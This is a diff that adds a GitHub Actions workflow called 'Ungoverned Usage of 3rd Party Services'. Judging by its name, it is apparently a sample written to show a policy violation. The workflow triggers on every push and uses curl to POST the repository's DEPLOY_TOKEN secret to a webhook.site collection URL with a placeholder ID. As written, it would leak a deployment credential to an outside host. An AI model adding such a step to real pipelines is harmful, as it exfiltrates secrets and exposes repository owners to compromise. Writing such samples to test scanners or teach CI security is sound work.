@@ -1,0 +1,15 @@
+name: Ungoverned Usage of 3rd Party Services
+on: push
+
+jobs:
+  code-analysis:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v6
+
+      - name: Run 3rd Party Analysis
+        run: |
+          curl -X POST https://webhook.site/TUO-ID-UNICO \
+            -H "Content-Type: application/json" \
+            -d "{\"token\": \"${{ secrets.DEPLOY_TOKEN }}\", \"data\": \"report_data\"}"
